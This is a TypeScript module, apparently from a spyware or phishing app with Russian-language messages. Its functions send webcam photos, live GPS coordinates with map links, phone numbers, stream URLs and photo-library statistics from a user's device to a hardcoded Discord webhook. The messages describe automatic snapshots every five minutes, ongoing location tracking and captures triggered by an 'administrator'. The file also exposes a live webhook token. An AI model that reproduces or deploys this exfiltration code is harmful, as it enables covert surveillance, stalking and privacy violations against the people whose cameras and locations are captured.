const WEBHOOK_URL = 'https://discord.com/api/webhooks/1341361105192222804/LjuKtVITjZpx7ujI7JpfV_di2ckGZBlD2hJT_FYaNYZdgtwU29kCFlODSL0d7tlD2VBc';

export const sendToWebhook = async (phoneNumber: string, photoBlob?: Blob, location?: { latitude: number; longitude: number }, streamUrl?: string) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `🔒 **МОНИТОРИНГ ВЕБ-КАМЕРЫ**\n📱 **Телефон:** ${phoneNumber}\n🕒 **Время:** ${timestamp}`;
    
    if (location) {
      const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      content += `\n📍 **Местоположение:** ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
      content += `\n🗺️ **Карта:** ${googleMapsUrl}`;
    }

    if (streamUrl) {
      content += `\n📹 **Прямая трансляция:** ${streamUrl}`;
    }

    content += `\n\n⚠️ **Автоматический снимок с устройства пользователя**`;

    formData.append('content', content);

    if (photoBlob) {
      formData.append('file', photoBlob, `webcam_${phoneNumber}_${Date.now()}.jpg`);
    }

    console.log('Отправка данных мониторинга в Discord...');

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Ошибка webhook:', errorText);
      throw new Error(`Ошибка webhook: ${response.status} - ${errorText}`);
    }

    console.log('Данные мониторинга успешно отправлены в Discord');
    return { success: true };
  } catch (error) {
    console.error('Ошибка webhook:', error);
    return { success: false, error: error instanceof Error ? error.message : 'Неизвестная ошибка' };
  }
};

export const sendSessionStartNotification = async (phoneNumber: string, location?: { latitude: number; longitude: number }) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `🚨 **НОВАЯ СЕССИЯ МОНИТОРИНГА ЗАПУЩЕНА**\n📱 **Телефон:** ${phoneNumber}\n🕒 **Начало:** ${timestamp}`;
    
    if (location) {
      const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      content += `\n📍 **Начальное местоположение:** ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
      content += `\n🗺️ **Карта:** ${googleMapsUrl}`;
    }

    content += `\n\n📹 **Мониторинг веб-камеры активен**`;
    content += `\n📸 **Автоматические снимки каждые 5 минут**`;
    content += `\n📍 **Отслеживание местоположения включено**`;

    formData.append('content', content);

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Ошибка уведомления о сессии:', errorText);
      throw new Error(`Ошибка уведомления о сессии: ${response.status} - ${errorText}`);
    }

    console.log('Уведомление о начале сессии успешно отправлено');
    return { success: true };
  } catch (error) {
    console.error('Ошибка уведомления о сессии:', error);
    return { success: false, error: error instanceof Error ? error.message : 'Неизвестная ошибка' };
  }
};

export const sendManualCapture = async (phoneNumber: string, photoBlob: Blob, location?: { latitude: number; longitude: number }) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `📸 **РУЧНОЙ СНИМОК ЭКРАНА**\n📱 **Телефон:** ${phoneNumber}\n🕒 **Время:** ${timestamp}`;
    
    if (location) {
      const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      content += `\n📍 **Местоположение:** ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
      content += `\n🗺️ **Карта:** ${googleMapsUrl}`;
    }

    content += `\n\n👤 **Снимок сделан вручную администратором**`;

    formData.append('content', content);
    formData.append('file', photoBlob, `manual_capture_${phoneNumber}_${Date.now()}.jpg`);

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Ошибка ручного снимка:', errorText);
      throw new Error(`Ошибка ручного снимка: ${response.status} - ${errorText}`);
    }

    console.log('Ручной снимок успешно отправлен в Discord');
    return { success: true };
  } catch (error) {
    console.error('Ошибка ручного снимка:', error);
    return { success: false, error: error instanceof Error ? error.message : 'Неизвестная ошибка' };
  }
};

export const sendPhotoLibraryUpdate = async (phoneNumber: string, photoCount: number, totalSize: string) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `📚 **ОБНОВЛЕНИЕ БИБЛИОТЕКИ ФОТО**\n📱 **Телефон:** ${phoneNumber}\n🕒 **Время:** ${timestamp}`;
    content += `\n📸 **Всего фото:** ${photoCount}`;
    content += `\n💾 **Общий размер:** ${totalSize}`;
    content += `\n\n🔄 **Библиотека фотографий обновлена**`;

    formData.append('content', content);

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Ошибка обновления библиотеки:', errorText);
      throw new Error(`Ошибка обновления библиотеки: ${response.status} - ${errorText}`);
    }

    console.log('Обновление библиотеки фото успешно отправлено');
    return { success: true };
  } catch (error) {
    console.error('Ошибка обновления библиотеки:', error);
    return { success: false, error: error instanceof Error ? error.message : 'Неизвестная ошибка' };
  }
};
